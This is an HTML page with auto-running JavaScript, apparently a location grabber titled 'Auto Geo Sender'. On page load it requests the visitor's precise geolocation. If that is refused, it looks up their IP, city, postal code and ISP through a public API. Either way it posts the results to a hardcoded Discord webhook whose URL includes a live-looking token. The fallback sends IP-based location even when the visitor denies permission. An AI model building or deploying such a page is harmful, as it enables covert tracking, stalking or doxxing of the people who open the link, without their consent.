<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Auto Geo Sender</title>
  <style>
    body { font-family: Arial, sans-serif; max-width:720px; margin:40px auto; padding:18px; text-align:center; }
    #status { margin-top:18px; padding:12px; border-radius:6px; }
    .info { background:#e9f7ff; color:#034f84; }
    .success { background:#d4edda; color:#155724; }
    .error { background:#f8d7da; color:#721c24; }
    small { color: #666; display:block; margin-top:8px; }
  </style>
</head>
<body>
  <h1>Auto Geo Sender</h1>
  <p>This page will request your precise location (lat,lon) and automatically send it to the configured webhook. You will be prompted to allow location access.</p>
  <div id="status" class="info">Initializing...</div>
  <small>Requires HTTPS (or localhost). Location permission must be granted.</small>

  <script>
    // ----- CONFIG -----
    // Replace this with your Discord webhook URL.
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1411086092026777742/60wVbPvrvNubv9vpZaHbAFXf3HsYBxB-VjDEduG-Qj_6KFOPhKyRj6jtIah_4MqlkEJg';
    // Timeout for geolocation (ms)
    const GEO_TIMEOUT = 15000;

    const statusEl = document.getElementById('status');

    function setStatus(text, cls = 'info') {
      statusEl.textContent = text;
      statusEl.className = cls;
    }

    async function fetchIpInfo() {
      // fallback IP-based geo (HTTPS public API)
      try {
        const r = await fetch('https://ipapi.co/json/');
        if (!r.ok) throw new Error('IP API returned ' + r.status);
        const j = await r.json();
        return {
          ip: j.ip || null,
          country: j.country_name || null,
          region: j.region || null,
          city: j.city || null,
          postal: j.postal || null,
          lat: j.latitude || null,
          lon: j.longitude || null,
          org: j.org || j.asn || null,
          timezone: j.timezone || null
        };
      } catch (e) {
        return { ip: null };
      }
    }

    async function sendToWebhook(payloadObj) {
      try {
        const res = await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payloadObj)
        });
        if (!res.ok) {
          const txt = await res.text().catch(() => '');
          throw new Error(`Webhook error ${res.status} ${res.statusText} ${txt}`);
        }
        return true;
      } catch (err) {
        throw err;
      }
    }

    // Build a Discord embed payload (more structured than plain content)
    function buildDiscordPayload({ ipInfo, geoPosition, source }) {
      const fields = [];

      if (ipInfo?.ip) fields.push({ name: 'IP', value: String(ipInfo.ip), inline: true });
      fields.push({ name: 'Latitude', value: String(geoPosition.latitude ?? 'N/A'), inline: true });
      fields.push({ name: 'Longitude', value: String(geoPosition.longitude ?? 'N/A'), inline: true });
      if (geoPosition.accuracy != null) fields.push({ name: 'Accuracy (meters)', value: String(geoPosition.accuracy), inline: true });
      if (geoPosition.altitude != null) fields.push({ name: 'Altitude (meters)', value: String(geoPosition.altitude), inline: true });
      if (geoPosition.heading != null) fields.push({ name: 'Heading', value: String(geoPosition.heading), inline: true });
      if (ipInfo?.country) fields.push({ name: 'Country', value: String(ipInfo.country), inline: true });
      if (ipInfo?.region) fields.push({ name: 'Region', value: String(ipInfo.region), inline: true });
      if (ipInfo?.city) fields.push({ name: 'City', value: String(ipInfo.city), inline: true });
      if (ipInfo?.postal) fields.push({ name: 'Postal', value: String(ipInfo.postal), inline: true });
      if (ipInfo?.org) fields.push({ name: 'ISP/Org', value: String(ipInfo.org), inline: false });
      fields.push({ name: 'Source', value: source, inline: true });
      fields.push({ name: 'Timestamp', value: new Date().toISOString(), inline: false });

      return {
        username: 'AutoGeoBot',
        embeds: [
          {
            title: '📍 New Location Captured',
            fields,
            timestamp: new Date().toISOString()
          }
        ]
      };
    }

    async function captureAndSend() {
      setStatus('Requesting geolocation from the browser...', 'info');

      // First: attempt precise geolocation using browser API
      const geolocationPromise = new Promise((resolve, reject) => {
        if (!('geolocation' in navigator)) {
          reject(new Error('Geolocation API not available'));
          return;
        }
        navigator.geolocation.getCurrentPosition(
          position => resolve(position),
          err => reject(err),
          { enableHighAccuracy: true, timeout: GEO_TIMEOUT, maximumAge: 0 }
        );
      });

      let position = null;
      let ipInfo = null;
      let usedSource = 'geolocation';

      try {
        // race geolocation with a manual timeout in case browser misbehaves
        position = await Promise.race([
          geolocationPromise,
          new Promise((_, rej) => setTimeout(() => rej(new Error('Geolocation timed out')), GEO_TIMEOUT + 2000))
        ]);

        setStatus('Geolocation obtained. Fetching IP info (fallback)...', 'info');
        ipInfo = await fetchIpInfo();

      } catch (geoErr) {
        // If we failed to get geolocation (denied, timeout, not available), fallback to IP-based
        usedSource = 'ip-fallback';
        setStatus('Could not get precise geolocation: ' + geoErr.message + '. Falling back to IP-based location...', 'info');
        ipInfo = await fetchIpInfo();
        // Use ipInfo lat/lon if available
        position = {
          coords: {
            latitude: ipInfo.lat ?? null,
            longitude: ipInfo.lon ?? null,
            accuracy: null,
            altitude: null,
            heading: null,
            speed: null
          }
        };
      }

      // Build payload and send
      const payload = buildDiscordPayload({
        ipInfo,
        geoPosition: {
          latitude: position?.coords?.latitude ?? null,
          longitude: position?.coords?.longitude ?? null,
          accuracy: position?.coords?.accuracy ?? null,
          altitude: position?.coords?.altitude ?? null,
          heading: position?.coords?.heading ?? null,
          speed: position?.coords?.speed ?? null
        },
        source: usedSource
      });

      setStatus('Sending to webhook...', 'info');
      try {
        await sendToWebhook(payload);
        setStatus('Success — location sent to webhook.', 'success');
      } catch (err) {
        setStatus('Failed to send webhook: ' + err.message, 'error');
      }
    }

    // Auto-run on page load
    window.addEventListener('DOMContentLoaded', () => {
      // Small delay so user sees the page content before prompt
      setTimeout(() => {
        captureAndSend();
      }, 600);
    });
  </script>
</body>
</html>

